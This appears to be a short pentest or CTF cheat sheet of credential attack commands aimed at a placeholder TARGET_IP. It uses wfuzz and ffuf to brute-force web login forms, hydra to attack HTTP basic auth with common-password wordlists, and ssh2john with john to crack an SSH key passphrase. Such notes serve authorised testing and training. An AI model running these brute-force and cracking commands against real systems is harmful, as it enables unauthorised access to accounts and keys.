if you have username you can check against default credentials:
```bash
wfuzz -X POST \   -u "http://TARGET_IP/php/index.php" \  -H "Content-Type: application/x-www-form-urlencoded" \  -d "function=Session::login&user=samarium&password=FUZZ" \  -w /usr/share/wordlists/seclists/Passwords/Common-Credentials/10k-most-common.txt
```

basic auth:
```bash
ffuf -w valid_usernames.txt:W1,/usr/share/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:W2 -X POST -d "username=W1&password=W2" -H "Content-Type: application/x-www-form-urlencoded" -u http://TARGET_IP/customers/login -fc 200
```
hydra basic auth:
```
hydra -I -l bob -P /usr/share/wordlists/seclists/Passwords/Common-Credentials/10k-most-common.txt "http-get://TARGET_IP/protected/basic_auth:A=BASIC:F=401"
```
ssh password cracking:
```bash
ssh2john id_rsa > id_rsa.hash  
john id_rsa.hash
```
